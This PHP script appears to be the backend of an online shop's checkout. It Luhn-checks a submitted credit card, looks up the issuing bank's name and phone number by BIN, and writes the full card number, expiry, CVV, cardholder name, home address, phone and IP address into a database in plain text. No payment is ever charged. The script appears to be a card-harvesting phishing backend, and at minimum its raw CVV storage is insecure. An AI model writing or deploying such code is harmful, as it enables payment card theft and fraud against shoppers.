<?php
include 'inc/pdo.php';

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

function isValidCardNumber($cardNumber) {
    if (empty($cardNumber) || !is_numeric($cardNumber) || $cardNumber <= 0) {
        return false;
    }
    $sum = 0;
    $doubleUp = false;
    $cardNumberArray = array_map('intval', str_split(strrev($cardNumber)));
    foreach ($cardNumberArray as $index => $currentNum) {
        if ($doubleUp) {
            $currentNum *= 2;
            if ($currentNum > 9) {
                $currentNum -= 9;
            }
        }
        $sum += $currentNum;
        $doubleUp = !$doubleUp;
    }
    return ($sum % 10 === 0);
}

function cardinfo($cardNumber){
    $cardNumber = str_replace(' ', '', $cardNumber);
    if (empty($cardNumber) || !preg_match('/^\d{16}$/', $cardNumber)) {
        return json_decode(json_encode(["error" => "Geçersiz kart numarası. 16 haneli olmalıdır ve sadece rakam içermelidir."]),true);
    }
    $firstSixDigits = substr($cardNumber, 0, 6);
    $apiUrl = "https://lookup.binlist.net/$firstSixDigits";
    try {
        $response = @file_get_contents($apiUrl);
        
        if ($response === false) {
            throw new Exception("API'ye ulaşılamıyor.");
        }
        $cardInfo = json_decode($response, true);
        $data = [
            'name' => isset($cardInfo['bank']['name']) ? $cardInfo['bank']['name'] : null,
            'phone' => isset($cardInfo['bank']['phone']) ? $cardInfo['bank']['phone'] : null,
            'country' => isset($cardInfo['country']['name']) ? $cardInfo['country']['name'] : null,
            'type' => isset($cardInfo['type']) ? $cardInfo['type'] : null
        ];
        $cardCheck = ['valid' => isValidCardNumber($cardNumber)];
        return json_decode(json_encode(array_merge($data, $cardCheck)), true);
    } catch (Exception $e) {
        return json_decode(json_encode(["error" => $e->getMessage()]), true);
    }
}


$requiredVariables = ['adi', 'soyadi', 'phone', 'adres_ismi', 'bina_no', 'kat_no', 'daire_no', 'adres_tarifi'];
foreach ($requiredVariables as $variable) {
    if (!isset($_SESSION[$variable])) {
        die(json_encode(["success" => false, "error" => "Sistemsel Hata"]));
        exit();
    }
}


$ccname = isset($_POST['ccname']) ? $_POST['ccname'] : '';
$cardnumber = isset($_POST['cardnumber']) ? $_POST['cardnumber'] : '';
$ccmonth = isset($_POST['ccmonth']) ? $_POST['ccmonth'] : '';
$ccyear = isset($_POST['ccyear']) ? $_POST['ccyear'] : '';
$cvc = isset($_POST['cvc']) ? $_POST['cvc'] : '';

// Kontrolleri yap
if (empty($ccname) && empty($cardnumber) && empty($ccmonth) && empty($ccyear) && empty($cvc)) {
    die(json_encode(["success" => false, "error" => "Geçersiz Kart Bilgisi."]));
}

if (!isValidCardNumber($cardnumber)) {
    die(json_encode(["success" => false, "error" => "Geçersiz Kart Numarası"]));
}



$cartItemIds = [];
foreach ($_COOKIE as $cookieName => $cookieValue) {
    if (strpos($cookieName, 'cart_item_') !== false) {
       $id = substr($cookieName, strlen('cart_item_'));
       if (!empty($id)) {
             $cartItemIds[] = $id;
       }
    }
}

$cardinf = cardinfo($cardnumber);

$adi = $_SESSION['adi'];
$soyadi = $_SESSION['soyadi'];
$il = $_SESSION['il'];
$ilce = $_SESSION['ilce'];
$mahalle = $_SESSION['mahalle'];
$bina_no = $_SESSION['bina_no'];
$kat_no = $_SESSION['kat_no'];
$daire_no = $_SESSION['daire_no'];
$adres_tarifi = $_SESSION["adres_tarifi"];
$adres_ismi = $_SESSION["adres_ismi"];
$telefon = $_SESSION['telefon'];

$kart_no = $cardnumber;
$kart_name = $ccname;
$skt_no = strval(explode(":",$ccmonth)[1]) . "/" . strval(explode(":",$ccyear)[1]);
$cvv_no = $cvc;

$banka_adi = $cardinf['name'];
$banka_no = $cardinf['phone'];
$kart_tipi = $cardinf['type'];

$aldigi_urunler = implode(',', $cartItemIds);
$tutar = $_SESSION['toplam_fiyat'];
$ip = $_SERVER['REMOTE_ADDR'];



$sql = "INSERT INTO `siparisler` (`adi`, `soyadi`, `il`, `ilce`, `mahalle`, `bina_no`, `kat_no`, `daire_no`, `adres_tarifi`, `adres_ismi`, `telefon`, `kart_no`, `kart_name`, `skt_no`, `cvv_no`, `banka_adi`, `banka_no`, `kart_tipi`, `tarih`, `tutar`, `ip`, `aldigi_urunler`) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?)";

// PDO prepared statement kullanarak sorguyu hazırla
$stmt = $pdo->prepare($sql);

// Parametreleri bağla
$stmt->bindParam(1, $adi);
$stmt->bindParam(2, $soyadi);
$stmt->bindParam(3, $il);
$stmt->bindParam(4, $ilce);
$stmt->bindParam(5, $mahalle);
$stmt->bindParam(6, $bina_no);
$stmt->bindParam(7, $kat_no);
$stmt->bindParam(8, $daire_no);
$stmt->bindParam(9, $adres_tarifi);
$stmt->bindParam(10, $adres_ismi);
$stmt->bindParam(11, $telefon);
$stmt->bindParam(12, $kart_no);
$stmt->bindParam(13, $kart_name);
$stmt->bindParam(14, $skt_no);
$stmt->bindParam(15, $cvv_no);
$stmt->bindParam(16, $banka_adi);
$stmt->bindParam(17, $banka_no);
$stmt->bindParam(18, $kart_tipi);
$stmt->bindParam(19, $tutar);
$stmt->bindParam(20, $ip);
$stmt->bindParam(21, $aldigi_urunler);

// Sorguyu çalıştır
$stmt->execute();

    


    
    


?>